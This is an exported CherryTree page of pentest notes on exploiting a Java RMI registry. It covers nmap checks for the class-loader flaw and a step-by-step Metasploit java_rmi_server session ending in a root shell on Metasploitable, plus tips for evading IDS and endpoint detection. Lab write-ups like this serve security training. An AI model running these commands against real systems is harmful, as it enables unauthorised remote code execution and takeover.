<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Java RMI registry (service: GNU Classpath grmiregistry port:1099)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Java RMI registry (service: GNU Classpath grmiregistry port:1099)</h1><br/>Some services offer a way to invoke Java methods remotely, also known as <a href="https://en.wikipedia.org/wiki/Java_remote_method_invocation">Java RMI</a>.<br /><br /><strong>Vulnerability</strong><br />Exists a vulnerability in default configurations of RMI Registry and RMI Activation Services, that affects what is known as the “<a href="http://java.sys-con.com/node/35865">RMI Distributed Garbage<br />Collector</a>&quot;.<br />It essentially allows the loading of arbitrary Java classes from an attacker-defined URL.<br /><br />0. Identify<br />    The Java RMI Registry service is typically found on port 1099 TCP,  on Linux systems is identified by the “GNU Classpath grmiregistry”<br />    <a href=""><img src="images/1449-1.png" alt="images/1449-1.png" /></a><br />1. Test<br />    <div class="codebox"><pre>nmap -sV --script <span style="color:#3ad900;font-weight:400">&quot;rmi-dumpregistry or rmi-vuln-classloader&quot;</span> -p &lt;PORT&gt; &lt;IP&gt;</pre></div><br />    <a href=""><img src="images/1449-2.png" alt="images/1449-2.png" /></a><br />3. Exploit<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># msfconsole<br />msf&gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>misc<span style="color:#ff9d00;font-weight:700">/</span>java_rmi_server<br />msf&gt; show options<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> rhost &lt;targetIp&gt;<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> rport 1099            <span style="color:#0088ff;font-weight:400">#DEFAULT: most of the time OK, this is the default port where run java-rmi</span><br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> srvhost 0.0.0.0       <span style="color:#0088ff;font-weight:400">#DEFAULT: most of the time OK, listen on any network interface</span><br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> srvport 8080          <span style="color:#0088ff;font-weight:400">#DEFAULT: most of the time OK, unless you’re already running a service on TCP 8080</span></pre></div><br />    For additional <span style="text-decoration:underline;">IDS or Endpoint Detection evasion</span> (if required for your specific target), you may also want to set <code>SSL</code> option to true<br />    This can help in evading (some) on-the-wire heuristics detection solutions. However, most will flag many Metasploit modules’ default SSL certificates.<br />    Hence the <code>SSLCert</code> option which allows you to specify your own custom SSL certificate for the SRVHOST <br />    <div class="codebox"><pre>msf&gt; exploit -j<br />msf&gt; sessions<br />msf&gt; sessions -i 1<br />meterpreter&gt; shell<br />    <span style="color:#ff9d00;font-weight:700">id</span><br />    <span style="color:#ff9d00;font-weight:700">uname</span> -a<br />    python -c <span style="color:#3ad900;font-weight:400">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span><br /><span style="color:#ff9d00;font-weight:700">sh</span># <span style="color:#ff9d00;font-weight:700">bash</span> <br />root@metasploitable<span style="color:#ff9d00;font-weight:700">:/</span>#</pre></div><br />    <a href=""><img src="images/1449-3.png" alt="images/1449-3.png" /></a><br /><br /><br />Bibliography:<br />• Vulnerable machine: <a href="https://sourceforge.net/projects/metasploitable/files/latest/download">https://sourceforge.net/projects/metasploitable/files/latest/download</a></div>
</body>
</html>
